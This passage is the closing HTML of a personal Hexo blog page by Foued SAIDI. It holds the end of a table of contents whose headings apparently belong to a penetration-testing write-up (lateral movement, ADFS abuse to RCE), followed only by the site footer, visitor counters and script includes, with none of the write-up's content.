RCE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lateral-Movement-florence-ramirez"><span class="nav-text">Lateral Movement - florence.ramirez</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-ADFS-abuse-to-RCE"><span class="nav-text">Privilege Escalation - ADFS abuse to RCE</span></a></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="åœ–å±¤_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
            <i class="fa-regular fa-cog fa-spin"></i>
        </li>
        
            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
        
    </ul>
</div>

    </div>

    <div class="image-viewer-container">
    <img src="">
</div>


    

</main>


    
<script src="/js/libs/Swup.min.js"></script>

<script src="/js/libs/SwupSlideTheme.min.js"></script>

<script src="/js/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>







<script src="/js/tools/imageViewer.js" type="module"></script>

<script src="/js/utils.js" type="module"></script>

<script src="/js/main.js" type="module"></script>

<script src="/js/layouts/navbarShrink.js" type="module"></script>

<script src="/js/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/layouts/categoryList.js" type="module"></script>





    
<script src="/js/tools/codeBlock.js" type="module"></script>




    
<script src="/js/layouts/lazyload.js" type="module"></script>




    
<script src="/js/tools/runtime.js"></script>

    
<script src="/js/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/libs/Typed.min.js"></script>

  
<script src="/js/plugins/typed.js" type="module"></script>







<div class="post-scripts" data-swup-reload-script>
    
        
<script src="/js/libs/anime.min.js"></script>

        
<script src="/js/tools/tocToggle.js" type="module"></script>

<script src="/js/layouts/toc.js" type="module"></script>

<script src="/js/plugins/tabs.js" type="module"></script>

    
</div>


</body>
</html>
